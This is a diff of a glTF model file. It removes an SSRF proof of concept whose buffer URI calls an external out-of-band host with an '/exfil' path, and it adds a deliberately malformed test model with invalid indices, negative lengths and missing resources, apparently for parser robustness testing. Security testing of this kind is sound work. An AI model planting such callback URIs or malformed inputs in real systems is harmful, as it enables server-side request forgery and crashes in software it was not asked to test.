@@ -1,48 +1,127 @@
 {
-  "asset": {
-    "generator": "SSRF PoC",
-    "version": "2.0"
-  },
-  "buffers": [
+  "accessors": [
     {
-      "uri": "https://elulowseqpnqwrotewdfuf0qhdxbs9x67.oast.fun/exfil?data=ssrf_confirmed",
-      "byteLength": 100
+      "bufferView": 99,
+      "componentType": 5126,
+      "count": 999999,
+      "type": "VEC2"
+    },
+    {
+      "bufferView": 1,
+      "componentType": 9999,
+      "count": -1,
+      "type": "VEC3"
+    },
+    {
+      "bufferView": 2,
+      "componentType": 5126,
+      "count": 406,
+      "type": "VEC5"
+    },
+    {
+      "bufferView": 3,
+      "componentType": 5126,
+      "count": 406,
+      "type": "VEC3",
+      "max": [0.0],
+      "min": [1.0, 2.0, 3.0, 4.0]
+    },
+    {
+      "bufferView": 4,
+      "componentType": 5123,
+      "count": 2046,
+      "type": "SCALAR"
     }
   ],
+
+  "asset": {
+    "generator": "Malformed Test",
+    "version": "2.0"
+  },
+
   "bufferViews": [
     {
       "buffer": 0,
-      "byteLength": 100
-    }
-  ],
-  "accessors": [
+      "byteLength": -100
+    },
     {
-      "bufferView": 0,
-      "componentType": 5126,
-      "count": 1,
-      "type": "VEC3"
+      "buffer": 0,
+      "byteOffset": 9999999,
+      "byteLength": 4872
+    },
+    {
+      "buffer": 5,
+      "byteOffset": 8120,
+      "byteLength": 6496
+    },
+    {
+      "buffer": 0,
+      "byteOffset": 14616,
+      "byteLength": 0
+    },
+    {
+      "buffer": 0,
+      "byteOffset": 19488,
+      "byteLength": 4092
     }
   ],
+
+  "buffers": [
+    {
+      "uri": "Missing.bin",
+      "byteLength": 1
+    }
+  ],
+
+  "images": [
+    {
+      "uri": "does_not_exist.png"
+    }
+  ],
+
   "meshes": [
     {
       "primitives": [
         {
           "attributes": {
-            "POSITION": 0
-          }
+            "POSITION": 999,
+            "NORMAL": 1
+          },
+          "indices": 42,
+          "material": 5
         }
       ]
     }
   ],
-  "nodes": [
+
+  "materials": [
     {
-      "mesh": 0
+      "pbrMetallicRoughness": {
+        "baseColorTexture": {
+          "index": 99
+        }
+      }
     }
   ],
-  "scene": 0,
+
+  "nodes": [
+    {
+      "mesh": 8,
+      "rotation": [0.0, 1.0]
+    }
+  ],
+
+  "scene": 5,
+
   "scenes": [
     {
-      "nodes": [0]
+      "nodes": [999]
+    }
+  ],
+
+  "textures": [
+    {
+      "source": 12
     }
   ]
 }
